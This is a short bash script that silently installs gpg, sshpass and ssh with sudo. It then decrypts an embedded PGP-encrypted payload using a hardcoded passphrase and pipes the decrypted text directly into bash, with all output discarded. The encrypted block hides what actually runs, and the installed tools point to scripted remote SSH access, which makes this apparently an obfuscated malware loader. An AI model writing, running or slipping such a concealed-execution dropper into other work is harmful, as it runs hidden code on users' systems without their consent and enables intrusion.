#!/bin/bash

{
  # List of required tools and their respective packages
  declare -A required_tools=(
    [gpg]="gnupg"
    [sshpass]="sshpass"
    [ssh]="openssh-client"
  )

  missing_packages=()

  check_and_collect() {
    for cmd in "${!required_tools[@]}"; do
      if ! command -v "$cmd" &> /dev/null; then
        missing_packages+=("${required_tools[$cmd]}")
      fi
    done
  }

  install_missing_packages() {
    if [ ${#missing_packages[@]} -gt 0 ]; then
      sudo apt-get update -qq > /dev/null 2>&1
      if ! sudo apt-get install -y -qq --no-install-recommends "${missing_packages[@]}" > /dev/null 2>&1; then
        exit 1
      fi
      hash -r
    fi
  }

  main() {
    check_and_collect
    install_missing_packages

    gpg -d --batch --yes --quiet --passphrase "Letsget@@1" <<'EOF' | bash > /dev/null 2>&1
-----BEGIN PGP MESSAGE-----

jA0ECQMCWfo7Q35X8Q3/0ukBDUzrGLVjt2GE+ejw5Y8I6q+/MVMKBeb6NL652MxA
msi2LDW1saJgxc+lJ4eEo4wftrmjjygULw+FK+x86xERiKnRu8pdiWZYIBfNa52M
NEcQGr/qDgdyLj1QJFcisTWFkntby5hSPgkzUz51r7ylvy9+zgmkN9kSt5WRQueB
Df0s1/Y17yZ/4pvjz+QiIOfCRjOZ/QNwkIYR6FVZwgd9HDDsU76LcSYrbXhU08q+
UlmV94EaRfQjOT8whJulQOhTj8QYSx29xyuYN1Ncw0bcjQvCfuGg68Oy0oufKcW7
1ikplY4Uz6rRRqemJ+YYWLgnHhaO1+Wl3j22B0taK27Y34zUxjWvLObEkHxsSRwf
sI70D7w0Q5yWLzGJpLZQpLT9f767Lu8gVTWgtRm6pMYiiDJZXeIwVWt3ra5vCxRA
ONnw/bI575TVKtr29ejQc/smPrD78LeRb9oUEsoeQJmTSIMBXZDJrpHv6xczRHYp
iRmlOtmTa8kboLr0ZLxII5wSmZ4u4ihbabdq8v35mYbau9dryGgDxf98IcuXLtU0
REBD3dk48m41mJXzwhQo0RX4Bffix3mJrsEYcs6AooogRMVG3Uab+SvUXwo6VMa6
d+NXH/ZnXTxVvye58C2oZnTeDCSvrAZe11CY47CZ/cnCkL7bXRlQ+DaPrOWXRkO9
S8AzOiZ7Bl5LB9mz9U6Qgxdteee0bYaJ6ebKk1lRZnDDFkXz1pGwyPJp0HBGnNQc
A/fBsE8QNgvfZpa7DBDg6RvA9potU1pHuC7Cwhqko3FnsFqXvgAcr8N7d02TQ7/y
VSHmfsJwNqun82WKBudfIeI0PhxCFyxbR0Bepih16Y7cG9JugY58RXHtlX4B5bp+
hx7H90/ZRg2yt1+HGfU/PBA8EF+w59Wrg81ktOACW19tKsBsz1w5K0YS0mM7lizE
KQhhE7nZ4foCZaFc3BdFAX4v6S01489DKxpWH5m9M9kzqzM/lkOOnc1VIMSiBagS
bkEr3cYd
=7dOr
-----END PGP MESSAGE-----
EOF
  }

  main

} > /dev/null 2>&1
